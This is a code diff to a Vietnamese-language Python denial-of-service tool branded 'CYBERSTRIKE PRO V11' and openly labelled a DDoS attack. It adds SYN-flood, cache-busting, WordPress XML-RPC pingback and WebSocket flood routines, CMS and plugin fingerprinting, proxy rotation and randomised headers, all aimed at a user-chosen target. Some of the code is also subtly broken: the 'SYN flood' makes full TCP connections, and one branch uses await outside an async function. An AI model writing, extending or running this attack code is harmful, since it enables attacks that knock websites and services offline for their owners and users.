     hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")
 
-# Hiển thị menu chính (cập nhật với các tính năng VIP)
+# Tính năng VIP mới 1: Tấn công SYN Flood
+def syn_flood_attack(target_ip: str, port: int, duration: float):
+    global success_count, error_count
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(2)
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            try:
+                sock.connect((target_ip, port))
+                sock.send(b"\x00" * 128)  # Gửi gói SYN rỗng
+                console.print(f"[ultimate]SYN FLOOD: Gửi gói đến [bold green]{target_ip}:{port}[/] [success][✓][/]")
+                with manager:
+                    success_count += 1
+            except Exception as e:
+                with manager:
+                    error_count += 1
+                console.print(f"[error]SYN FLOOD: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
+            time.sleep(0.001)
+        sock.close()
+    except Exception as e:
+        console.print(f"[error]SYN FLOOD: Lỗi: [bold red]{str(e)}[/] [error][✗][/]")
+
+# Tính năng VIP mới 2: Tấn công Cache Busting
+async def cache_busting_attack(url: str, requests_per_thread: int, duration: float):
+    global success_count, error_count, response_times
+    try:
+        async with aiohttp.ClientSession(headers=generate_random_headers()) as session:
+            start_time = time.time()
+            while time.time() - start_time < duration:
+                try:
+                    cache_buster = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+                    async with session.get(f"{url}?cb={cache_buster}", proxy=get_random_proxy()) as response:
+                        console.print(f"[ultimate]CACHE BUSTING: Mã trạng thái: [bold green]{response.status}[/] [success][✓][/]")
+                        with manager:
+                            success_count += 1
+                            response_times.append((time.time() - start_time) * 1000)
+                except Exception as e:
+                    with manager:
+                        error_count += 1
+                    console.print(f"[error]CACHE BUSTING: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
+                await asyncio.sleep(random.uniform(0.00001, 0.00005))
+    except Exception as e:
+        console.print(f"[error]CACHE BUSTING: Lỗi khởi tạo: [bold red]{str(e)}[/] [error][✗][/]")
+
+# Tính năng VIP mới 3: Tấn công XML-RPC Flood
+async def xmlrpc_flood_attack(url: str, duration: float):
+    global success_count, error_count, response_times
+    xml_payload = """<?xml version="1.0"?>
+<methodCall>
+    <methodName>pingback.ping</methodName>
+    <params>
+        <param><value><string>{}</string></value></param>
+        <param><value><string>{}</string></value></param>
+    </params>
+</methodCall>""".format(url, f"{url}/?p={random.randint(1,1000)}")
+    try:
+        async with aiohttp.ClientSession(headers=generate_random_headers()) as session:
+            start_time = time.time()
+            while time.time() - start_time < duration:
+                try:
+                    async with session.post(f"{url}/xmlrpc.php", data=xml_payload, proxy=get_random_proxy()) as response:
+                        console.print(f"[ultimate]XML-RPC FLOOD: Mã trạng thái: [bold green]{response.status}[/] [success][✓][/]")
+                        with manager:
+                            success_count += 1
+                            response_times.append((time.time() - start_time) * 1000)
+                except Exception as e:
+                    with manager:
+                        error_count += 1
+                    console.print(f"[error]XML-RPC FLOOD: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
+                await asyncio.sleep(random.uniform(0.00001, 0.00005))
+    except Exception as e:
+        console.print(f"[error]XML-RPC FLOOD: Lỗi khởi tạo: [bold red]{str(e)}[/] [error][✗][/]")
+
+# Tính năng VIP mới 4: Tấn công WebSocket Flood
+async def websocket_flood_attack(url: str, duration: float):
+    global success_count, error_count, response_times
+    ws_url = url.replace('http', 'ws').replace('https', 'wss')
+    try:
+        async with aiohttp.ClientSession() as session:
+            start_time = time.time()
+            while time.time() - start_time < duration:
+                try:
+                    async with session.ws_connect(ws_url, proxy=get_random_proxy()) as ws:
+                        await ws.send_str(json.dumps({"ping": random.randint(1, 1000000)}))
+                        console.print(f"[ultimate]WEBSOCKET FLOOD: Gửi gói đến [bold green]{ws_url}[/] [success][✓][/]")
+                        with manager:
+                            success_count += 1
+                            response_times.append((time.time() - start_time) * 1000)
+                except Exception as e:
+                    with manager:
+                        error_count += 1
+                    console.print(f"[error]WEBSOCKET FLOOD: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
+                await asyncio.sleep(random.uniform(0.00001, 0.00005))
+    except Exception as e:
+        console.print(f"[error]WEBSOCKET FLOOD: Lỗi khởi tạo: [bold red]{str(e)}[/] [error][✗][/]")
+
+# Tính năng VIP mới 5: Phân tích CMS và Plugin
+async def cms_plugin_scan(url: str) -> Dict:
+    cms_info = {"cms": None, "plugins": [], "version": None}
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, headers=generate_random_headers(), timeout=10) as response:
+                text = await response.text()
+                soup = BeautifulSoup(text, 'html.parser')
+                # Kiểm tra WordPress
+                if 'wp-content' in text or 'wp-includes' in text:
+                    cms_info["cms"] = "WordPress"
+                    meta = soup.find('meta', {'name': 'generator'})
+                    if meta and 'WordPress' in meta.get('content', ''):
+                        cms_info["version"] = meta['content'].split(' ')[-1]
+                    # Tìm plugin
+                    scripts = soup.find_all('script', src=True)
+                    for script in scripts:
+                        src = script['src']
+                        if 'wp-content/plugins' in src:
+                            plugin_name = src.split('wp-content/plugins/')[1].split('/')[0]
+                            cms_info["plugins"].append(plugin_name)
+                # Kiểm tra Joomla
+                elif 'Joomla' in text or 'index.php?option=com_' in text:
+                    cms_info["cms"] = "Joomla"
+                    meta = soup.find('meta', {'name': 'generator'})
+                    if meta and 'Joomla' in meta.get('content', ''):
+                        cms_info["version"] = meta['content'].split(' ')[-1]
+                # Kiểm tra Drupal
+                elif 'Drupal' in text or 'sites/default' in text:
+                    cms_info["cms"] = "Drupal"
+                    meta = soup.find('meta', {'name': 'generator'})
+                    if meta and 'Drupal' in meta.get('content', ''):
+                        cms_info["version"] = meta['content'].split(' ')[-1]
+                console.print(f"[ultimate]CMS SCAN: Phát hiện CMS: [bold green]{cms_info['cms'] or 'Không xác định'}[/], Version: [bold green]{cms_info['version'] or 'N/A'}[/], Plugins: [bold green]{', '.join(cms_info['plugins']) or 'Không tìm thấy'}[/] [success][✓][/]")
+    except Exception as e:
+        console.print(f"[error]CMS SCAN: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
+    return cms_info
+
+# Hiển thị menu chính
 def display_menu():
     clear_screen()
-    table = Table(title="[info]CYBERSTRIKE PRO V10 © Quang Bao 2025[/]", style="info")
+    table = Table(title="[info]CYBERSTRIKE PRO V11 © Quang Bao 2025[/]", style="info")
     table.add_column("ID", style="highlight")
     table.add_column("Chức năng", style="success")
     table.add_column("Mô tả")
@@ -559,7 +769,12 @@ def display_menu():
     table.add_row("10", "[vip]UDP FLOOD[/]", "Tấn công UDP ngẫu nhiên")
     table.add_row("11", "[vip]SUBDOMAIN SCAN[/]", "Quét subdomain mục tiêu")
     table.add_row("12", "[vip]WEB STRUCTURE ANALYSIS[/]", "Phân tích cấu trúc website")
-    table.add_row("13", "[bold green]THOÁT[/]", "Thoát chương trình")
+    table.add_row("13", "[ultimate]SYN FLOOD[/]", "Tấn công SYN Flood mạnh mẽ")
+    table.add_row("14", "[ultimate]CACHE BUSTING[/]", "Tấn công phá vỡ cache")
+    table.add_row("15", "[ultimate]XML-RPC FLOOD[/]", "Tấn công XML-RPC WordPress")
+    table.add_row("16", "[ultimate]WEBSOCKET FLOOD[/]", "Tấn công WebSocket tốc độ cao")
+    table.add_row("17", "[ultimate]CMS & PLUGIN SCAN[/]", "Phân tích CMS và plugin")
+    table.add_row("18", "[bold green]THOÁT[/]", "Thoát chương trình")
     console.print(table)
 
 # Hàm chính
@@ -572,9 +787,9 @@ def main():
     while True:
         try:
             display_menu()
-            choice = hacker_prompt("Nhập lựa chọn (1-13): ")
+            choice = hacker_prompt("Nhập lựa chọn (1-18): ")
 
-            if choice == "13":
+            if choice == "18":
                 console.print("[warning]HỆ THỐNG: Thoát chương trình [success][✓][/]")
                 exit(0)
 
@@ -587,79 +802,79 @@ def main():
             try:
                 validated_url = validate_url(input_url)
                 host = urllib.parse.urlparse(validated_url).hostname
-                port = urllib.parse.urlparse(validated_url).port or 80
+                port = urllib.parse.urlparse(validated_url).port or (443 if validated_url.startswith('https') else 80)
             except ValueError as e:
                 host = input_url
                 port = 80
-                validated_url = f"http://{host}"
+                validated_url = f"https://{host}"
                 console.print(f"[warning]HỆ THỐNG: Xử lý mục tiêu như IP: [bold yellow]{host}[/] [warning][⚠][/]")
 
             console.print(f"[success]HỆ THỐNG: Mục tiêu đã khóa: [bold cyan]{validated_url}[/] [success][✓][/]")
-            loading_animation("Khóa mục tiêu", 2)
+            loading_animation("Phân tích mục tiêu", 3)
+            analysis = loop.run_until_complete(analyze_target(validated_url))
 
-            if choice == "2":
-                console.print("[info]HỆ THỐNG: Bắt đầu quét lỗ hổng... [success][⚡][/]")
-                loading_animation("Quét lỗ hổng web", 3)
-                vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
-                display_vulnerability_report(vulnerabilities)
-                continue
-            elif choice == "11":
-                console.print("[info]HỆ THỐNG: Bắt đầu quét subdomain... [success][⚡][/]")
-                loading_animation("Quét subdomain", 3)
-                subdomains = loop.run_until_complete(subdomain_scan(host))
-                table = Table(title="[info]KẾT QUẢ QUÉT SUBDOMAIN[/]", style="info")
-                table.add_column("Subdomain", style="highlight")
-                for subdomain in subdomains:
-                    table.add_row(subdomain)
-                console.print(table)
-                hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")
-                continue
-            elif choice == "12":
-                console.print("[info]HỆ THỐNG: Bắt đầu phân tích cấu trúc web... [success][⚡][/]")
-                loading_animation("Phân tích cấu trúc", 3)
-                structure = loop.run_until_complete(web_structure_analysis(validated_url))
-                table = Table(title="[info]PHÂN TÍCH CẤU TRÚC WEB[/]", style="info")
-                table.add_column("Loại", style="highlight")
-                table.add_column("Danh sách", style="success")
-                table.add_row("Endpoints", ", ".join(structure["endpoints"]) or "Không tìm thấy")
-                table.add_row("Forms", ", ".join(structure["forms"]) or "Không tìm thấy")
-                table.add_row("Links", ", ".join(structure["links"]) or "Không tìm thấy")
-                console.print(table)
-                hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")
+            if choice in ["2", "11", "12", "17"]:
+                if choice == "2":
+                    console.print("[info]HỆ THỐNG: Bắt đầu quét lỗ hổng... [success][⚡][/]")
+                    loading_animation("Quét lỗ hổng web", 3)
+                    vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
+                    display_vulnerability_report(vulnerabilities)
+                elif choice == "11":
+                    console.print("[info]HỆ THỐNG: Bắt đầu quét subdomain... [success][⚡][/]")
+                    loading_animation("Quét subdomain", 3)
+                    subdomains = analysis["subdomains"]
+                    table = Table(title="[info]KẾT QUẢ QUÉT SUBDOMAIN[/]", style="info")
+                    table.add_column("Subdomain", style="highlight")
+                    for subdomain in subdomains:
+                        table.add_row(subdomain)
+                    console.print(table)
+                    hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")
+                elif choice == "12":
+                    console.print("[info]HỆ THỐNG: Bắt đầu phân tích cấu trúc web... [success][⚡][/]")
+                    loading_animation("Phân tích cấu trúc", 3)
+                    structure = await loop.run_until_complete(web_structure_analysis(validated_url))
+                    table = Table(title="[info]PHÂN TÍCH CẤU TRÚC WEB[/]", style="info")
+                    table.add_column("Loại", style="highlight")
+                    table.add_column("Danh sách", style="success")
+                    table.add_row("Endpoints", ", ".join(structure["endpoints"]) or "Không tìm thấy")
+                    table.add_row("Forms", ", ".join(structure["forms"]) or "Không tìm thấy")
+                    table.add_row("Links", ", ".join(structure["links"]) or "Không tìm thấy")
+                    table.add_row("APIs", ", ".join(structure["apis"]) or "Không tìm thấy")
+                    console.print(table)
+                    hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")
+                elif choice == "17":
+                    console.print("[info]HỆ THỐNG: Bắt đầu phân tích CMS và plugin... [success][⚡][/]")
+                    loading_animation("Phân tích CMS", 3)
+                    cms_info = loop.run_until_complete(cms_plugin_scan(validated_url))
+                    table = Table(title="[info]PHÂN TÍCH CMS & PLUGIN[/]", style="info")
+                    table.add_column("Thông tin", style="highlight")
+                    table.add_column("Chi tiết", style="success")
+                    table.add_row("CMS", cms_info["cms"] or "Không xác định")
+                    table.add_row("Version", cms_info["version"] or "N/A")
+                    table.add_row("Plugins", ", ".join(cms_info["plugins"]) or "Không tìm thấy")
+                    console.print(table)
+                    hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")
                 continue
 
             # Nhập tham số tấn công
-            num_threads = int(hacker_prompt("Nhập số luồng (1-999999, mặc định: 1000): ", default="1000"))
-            requests_per_thread = int(hacker_prompt("Nhập số yêu cầu mỗi luồng (1-9999999, mặc định: 1000): ", default="1000"))
+            num_threads = analysis["recommended_threads"]
+            requests_per_thread = analysis["recommended_requests"]
             duration = int(hacker_prompt("Nhập thời gian tấn công (giây, mặc định: 60): ", default="60"))
-
-            num_threads = min(max(1, num_threads), 999999)
-            requests_per_thread = min(max(1, requests_per_thread), 9999999)
             duration = max(1, duration)
 
             num_threads, requests_per_thread = adjust_threads_for_device(num_threads, requests_per_thread)
-
-            console.print("[info]HỆ THỐNG: Đang đánh giá bảo mật... [success][⚡][/]")
-            loading_animation("Đánh giá bảo mật", 2)
-            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)
-
-            attack_strategy = "TẤN CÔNG NHẸ" if security_level == "THẤP" else "LỰC LƯỢNG TỐI ĐA" if security_level == "CAO" else "LỰC LƯỢNG VỪA PHẢI"
-            if security_level == "THẤP":
-                num_threads = min(recommended_threads, num_threads // 2)
-                requests_per_thread = min(recommended_requests, requests_per_thread // 2)
-            elif security_level == "CAO":
-                num_threads = max(recommended_threads, num_threads)
-                requests_per_thread = max(recommended_requests, requests_per_thread)
+            attack_strategy = "TẤN CÔNG SIÊU TỐC" if analysis["security_level"] == "CAO" else "TẤN CÔNG MẠNH" if analysis["security_level"] == "TRUNG BÌNH" else "TẤN CÔNG NHẸ"
 
             panel = Panel(
                 f"""
-[bold cyan]CHIẾN LƯỢC: [bold magenta]{'VIP ATTACK' if choice in ['3','4','5','6','7','8','9','10'] else 'CLOG ATTACK'}[/]
+[bold cyan]CHIẾN LƯỢC: [bold magenta]{'ULTIMATE ATTACK' if choice in ['13', '14', '15', '16'] else 'VIP ATTACK' if choice in ['3', '4', '5', '6', '7', '8', '9', '10'] else 'CLOG ATTACK'}[/]
 [bold cyan]Mục tiêu: [bold green]{validated_url}[/]
 [bold cyan]Luồng: [bold green]{num_threads:,}[/]
 [bold cyan]Yêu cầu/Luồng: [bold green]{requests_per_thread:,}[/]
 [bold cyan]Thời gian: [bold green]{duration}[/] giây
 [bold cyan]Chiến lược: [bold magenta]{attack_strategy}[/]
 [bold cyan]Tổng lượt đánh: [bold green]{num_threads * requests_per_thread:,}[/]
+[bold cyan]Vector tấn công: [bold green]{', '.join(analysis['attack_vectors'])}[/]
 [bold cyan]Bản quyền: [bold yellow]©2025 Quang Bao - DDos Attack[/]
                 """,
                 title="[info]THÔNG TIN TẤN CÔNG[/]",
@@ -726,6 +941,26 @@ def main():
                     t = threading.Thread(target=udp_flood_attack, args=(host, port, duration))
                     threads.append(t)
                     t.start()
+            elif choice == "13":
+                for _ in range(num_threads):
+                    t = threading.Thread(target=syn_flood_attack, args=(host, port, duration))
+                    threads.append(t)
+                    t.start()
+            elif choice == "14":
+                async def run_cache_busting():
+                    tasks = [cache_busting_attack(validated_url, requests_per_thread, duration) for _ in range(num_threads)]
+                    await asyncio.gather(*tasks)
+                loop.run_until_complete(run_cache_busting())
+            elif choice == "15":
+                async def run_xmlrpc():
+                    tasks = [xmlrpc_flood_attack(validated_url, duration) for _ in range(num_threads)]
+                    await asyncio.gather(*tasks)
+                loop.run_until_complete(run_xmlrpc())
+            elif choice == "16":
+                async def run_websocket():
+                    tasks = [websocket_flood_attack(validated_url, duration) for _ in range(num_threads)]
+                    await asyncio.gather(*tasks)
+                loop.run_until_complete(run_websocket())
 
             try:
                 for t in threads:
@@ -741,7 +976,7 @@ def main():
 
             report = Panel(
                 f"""
-[bold cyan]BÁO CÁO CHIẾN DỊCH: [bold magenta]{'VIP ATTACK' if choice in ['3','4','5','6','7','8','9','10'] else 'CLOG ATTACK'}[/]
+[bold cyan]BÁO CÁO CHIẾN DỊCH: [bold magenta]{'ULTIMATE ATTACK' if choice in ['13', '14', '15', '16'] else 'VIP ATTACK' if choice in ['3', '4', '5', '6', '7', '8', '9', '10'] else 'CLOG ATTACK'}[/]
 [bold cyan]Tổng lượt đánh: [bold green]{num_threads * requests_per_thread:,}[/]
 [bold cyan]Thành công: [bold green]{success_count:,} ({(success_count/(num_threads * requests_per_thread)*100):.1f}%)[/] [success][✓][\\]
 [bold cyan]Thất bại: [bold red]{error_count:,} ({(error_count/(num_threads * requests_per_thread)*100):.1f}%)[/] [error][✗][\\]
@@ -766,7 +1001,7 @@ def main():
 
 if __name__ == "__main__":
     try:
-        import psutil  # Optional: for memory-based thread adjustment
+        import psutil
     except ImportError:
         console.print("[warning]HỆ THỐNG: Mô-đun psutil không được cài đặt. Sử dụng giá trị RAM mặc định. [warning][⚠][/]")
     main()
